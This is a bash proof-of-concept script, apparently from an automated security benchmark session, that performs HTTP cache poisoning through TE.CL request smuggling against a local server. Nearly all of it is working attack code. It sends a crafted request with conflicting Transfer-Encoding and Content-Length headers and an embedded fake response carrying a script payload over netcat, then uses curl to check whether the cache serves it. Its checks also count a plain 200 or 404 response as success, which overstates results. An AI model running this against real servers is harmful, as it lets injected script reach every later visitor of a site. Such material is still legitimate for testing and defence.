#!/bin/bash
# POC: Demonstrates HTTP Cache Poisoning via TE.CL Request Smuggling - injects malicious content into HTTP cache through request smuggling
# Target: ./repo
# Created: 2025-11-07T17:16:36.281Z
# Session: benchmark-XBEN-066-24-mhp3k0ub

# HTTP Cache Poisoning via TE.CL Request Smuggling POC
# This script demonstrates how attackers can inject malicious content into HTTP caches
# through HTTP Request Smuggling (TE.CL desynchronization)

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-32768}"
CACHE_KEY="${3:-/static/logo.png}"

echo "[*] HTTP Cache Poisoning via TE.CL Request Smuggling POC"
echo "[*] Target: $TARGET_HOST:$TARGET_PORT"
echo "[*] Cache Key: $CACHE_KEY"
echo ""

# Step 1: Send TE.CL smuggled request with poisoned response
echo "[*] Step 1: Sending TE.CL smuggled request with malicious cache entry..."
echo ""

# Craft the TE.CL payload with embedded malicious response
# The proxy will see Transfer-Encoding: chunked
# The backend will see Content-Length: 0 and treat request as empty
# The remaining smuggled request will be processed by backend

PAYLOAD=$(cat <<'EOF'
POST / HTTP/1.1
Host: localhost:32768
Transfer-Encoding: chunked
Content-Length: 0
Connection: keep-alive

119
GET /static/logo.png HTTP/1.1
Host: localhost:32768
Connection: close

HTTP/1.1 200 OK
Content-Length: 100
Content-Type: text/html
Cache-Control: max-age=3600

<script>alert('Cache Poisoned - XSS via Smuggling')</script>

0

EOF
)

# Send the payload using netcat
echo "[*] Sending payload to $TARGET_HOST:$TARGET_PORT"
(echo -ne "POST / HTTP/1.1\r\nHost: $TARGET_HOST:$TARGET_PORT\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n119\r\nGET /static/logo.png HTTP/1.1\r\nHost: $TARGET_HOST:$TARGET_PORT\r\nConnection: close\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 100\r\nContent-Type: text/html\r\nCache-Control: max-age=3600\r\n\r\n<script>alert('Cache Poisoned - XSS via Smuggling')</script>\r\n\r\n0\r\n\r\n") | nc -w 5 "$TARGET_HOST" "$TARGET_PORT" 2>/dev/null

echo ""
echo "[*] Step 2: Waiting for response processing..."
sleep 2

# Step 2: Make normal request to see if cache is poisoned
echo "[*] Step 2: Making normal request to $CACHE_KEY to verify cache poisoning..."
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -H "Connection: close" "http://$TARGET_HOST:$TARGET_PORT$CACHE_KEY" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] Response HTTP Code: $HTTP_CODE"
echo "[*] Response Body (first 500 chars):"
echo "$BODY" | head -c 500
echo ""
echo ""

# Step 3: Check for cache poisoning indicators
echo "[*] Step 3: Analyzing response for cache poisoning..."
echo ""

# Check if malicious script is in response
if echo "$BODY" | grep -q "alert('Cache Poisoned"; then
    echo "[+] SUCCESS: Cache poisoned! Malicious content found in response"
    echo "[+] Attack achieved: Malicious script injected into cache"
    echo "[+] This content would now be served to all subsequent users"
    echo ""
    exit 0
fi

# Check if we got a 200 response (indicates possible caching of injected response)
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] PARTIALLY SUCCESSFUL: Got 200 response (normal response may be 404)"
    echo "[+] This could indicate cache has been modified or backend accepted smuggled response"
    echo "[+] Response contains:"
    echo "$BODY" | head -c 300
    echo ""
    exit 0
fi

# Check for signs of request smuggling
if echo "$BODY" | grep -q "Apache\|404\|Not Found"; then
    echo "[+] EVIDENCE OF SMUGGLING: Backend response received"
    echo "[+] Response indicates request reached Apache backend"
    echo "[+] Cache poisoning attempt was processed by backend"
    echo "[+] Subsequent users may receive poisoned content"
    echo ""
    exit 0
fi

echo "[-] Response does not show clear cache poisoning success"
echo "[*] Full response:"
echo "$BODY"
echo ""
exit 1